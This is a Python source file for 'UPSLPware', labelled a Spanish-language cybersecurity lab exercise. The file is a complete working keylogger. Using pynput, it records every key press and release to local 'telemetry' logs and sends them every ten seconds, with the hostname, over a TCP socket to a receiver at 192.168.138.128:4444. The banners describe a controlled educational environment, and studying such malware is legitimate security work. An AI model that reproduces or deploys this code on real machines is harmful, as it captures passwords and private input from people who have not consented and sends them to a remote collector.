
import os
import sys
import json
import socket
import threading
import logging
from datetime import datetime
from pynput.keyboard import Key, Listener


LOG_FILE = "telemtry_log.json"
LOG_TXT = "telemtry_log.txt"


RECEPTOR_IP = "192.168.138.128"
RECEPTOR_PORT = 4444
ENVIAR_TELEMETRIA = True
INTERVALO_ENVIO = 10


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("UPSLPware")


class EventoTeclado:

    contador = 0

    def __init__(self, tipo, tecla, timestamp=None):
        EventoTeclado.contador += 1
        self.id = f"evento_{EventoTeclado.contador:03d}"
        self.tipo = tipo
        self.tecla = str(tecla)
        self.timestamp = timestamp or datetime.now()
        self.fecha_hora = self.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    def to_dict(self):
        return {
            "id": self.id,
            "tipo": self.tipo,
            "tecla": self.tecla,
            "fecha_hora": self.fecha_hora,
            "timestamp_unix": self.timestamp.timestamp()
        }

    def to_log_line(self):
        return f"{self.fecha_hora} | {self.tipo} | {self.id} | {self.tecla}"

    def __repr__(self):
        return f"<Evento {self.id}: {self.tipo} {self.tecla}>"


class GestorEventos:

    def __init__(self):
        self.eventos = []
        self.buffer_envio = []
        self.lock = threading.Lock()
        self.ultimo_envio = datetime.now()
        self.conexion_activa = False
        self.socket_cliente = None


        self._inicializar_archivos()


        if ENVIAR_TELEMETRIA:
            self.hilo_envio = threading.Thread(target=self._envio_periodico, daemon=True)
            self.hilo_envio.start()

    def _inicializar_archivos(self):
        encabezado_txt = (
            
            "  UPSLPware - Registro de Eventos de Teclado\n"
            "  Laboratorio de Ciberseguridad - Entorno Controlado\n"
            "  Inicio: {}\n"
            
        ).format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

        if not os.path.exists(LOG_TXT):
            with open(LOG_TXT, 'w', encoding='utf-8') as f:
                f.write(encabezado_txt)
                f.write("FECHA_HORA          | TIPO   | ID         | TECLA\n")
                f.write("-" * 70 + "\n")

        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump({"eventos": [], "metadata": {"inicio": datetime.now().isoformat()}}, f, indent=2)

    def registrar_evento(self, tipo, tecla):
        evento = EventoTeclado(tipo, tecla)

        with self.lock:
            self.eventos.append(evento)
            self.buffer_envio.append(evento)


        self._persistir_evento(evento)


        logger.info(f"Capturado: {evento.to_log_line()}")

        return evento

    def _persistir_evento(self, evento):
        try:
            with open(LOG_TXT, 'a', encoding='utf-8') as f:
                f.write(evento.to_log_line() + "\n")
        except Exception as e:
            logger.error(f"Error al persistir en TXT: {e}")


        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)

            data["eventos"].append(evento.to_dict())
            data["metadata"]["ultimo_evento"] = datetime.now().isoformat()
            data["metadata"]["total_eventos"] = len(data["eventos"])

            with open(LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error al persistir en JSON: {e}")

    def _conectar_receptor(self):
        try:
            self.socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket_cliente.settimeout(5)
            self.socket_cliente.connect((RECEPTOR_IP, RECEPTOR_PORT))
            self.conexion_activa = True
            logger.info(f"[✓] Conectado al receptor {RECEPTOR_IP}:{RECEPTOR_PORT}")
            return True
        except Exception as e:
            logger.warning(f"[✗] No se pudo conectar al receptor: {e}")
            self.conexion_activa = False
            return False

    def _envio_periodico(self):
        while True:
            threading.Event().wait(INTERVALO_ENVIO)
            self._enviar_telemetria()

    def _enviar_telemetria(self):
        with self.lock:
            if not self.buffer_envio:
                return
            eventos_a_enviar = self.buffer_envio.copy()
            self.buffer_envio.clear()

        if not self.conexion_activa:
            if not self._conectar_receptor():

                with self.lock:
                    self.buffer_envio.extend(eventos_a_enviar)
                return

        try:
            payload = {
                "origen": socket.gethostname(),
                "timestamp_envio": datetime.now().isoformat(),
                "cantidad_eventos": len(eventos_a_enviar),
                "eventos": [e.to_dict() for e in eventos_a_enviar]
            }

            mensaje = json.dumps(payload, ensure_ascii=False) + "\n"
            self.socket_cliente.sendall(mensaje.encode('utf-8'))

            logger.info(f"[→] Enviados {len(eventos_a_enviar)} eventos al receptor")
            self.ultimo_envio = datetime.now()

        except Exception as e:
            logger.error(f"[✗] Error al enviar telemetría: {e}")
            self.conexion_activa = False
            with self.lock:
                self.buffer_envio.extend(eventos_a_enviar)

    def generar_reporte(self):
        with self.lock:
            total = len(self.eventos)
            presses = sum(1 for e in self.eventos if e.tipo == "PRESS")
            releases = sum(1 for e in self.eventos if e.tipo == "RELEASE")

        reporte = f"""

           REPORTE DE TELEMETRÍA - UPSLPware                  

  Total de eventos capturados: {total:>36} 
  Eventos PRESS:              {presses:>36} 
  Eventos RELEASE:            {releases:>36} 
  Último envío al receptor:   {str(self.ultimo_envio):>36} 
  Conexión activa:            {str(self.conexion_activa):>36} 

        """
        return reporte

    def cerrar(self):
        logger.info("Cerrando gestor de eventos...")
        self._enviar_telemetria()
        if self.socket_cliente:
            try:
                self.socket_cliente.close()
            except:
                pass
        logger.info(self.generar_reporte())


gestor = GestorEventos()

def on_press(key):
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)

    gestor.registrar_evento("PRESS", tecla)


    try:
        print(f"\r[KEYBOARD] {gestor.eventos[-1].to_log_line()}", end='', flush=True)
    except:
        pass


def on_release(key):
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)

    gestor.registrar_evento("RELEASE", tecla)


    if key == Key.esc:
        logger.info("\n[!] Tecla ESC detectada. Finalizando captura...")
        gestor.cerrar()
        return False


if __name__ == "__main__":
    print("""
    
                  UPSLPware - Laboratorio de Ciberseguridad      
                                                                  
      ⚠️  ENTORNO DE LABORATORIO CONTROLADO                      
                                                                  
      Este programa captura eventos de teclado con fines        
      educativos para comprender técnicas de ciberseguridad.      
                                                                  
      Presiona ESC para detener la captura.                      
    
    """)

    logger.info(f"Iniciando captura. Logs: {LOG_TXT}, {LOG_FILE}")
    logger.info(f"Receptor configurado: {RECEPTOR_IP}:{RECEPTOR_PORT}")

    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        logger.info("\n[!] Interrupción manual detectada.")
        gestor.cerrar()
    except Exception as e:
        logger.error(f"Error crítico: {e}")
        gestor.cerrar()
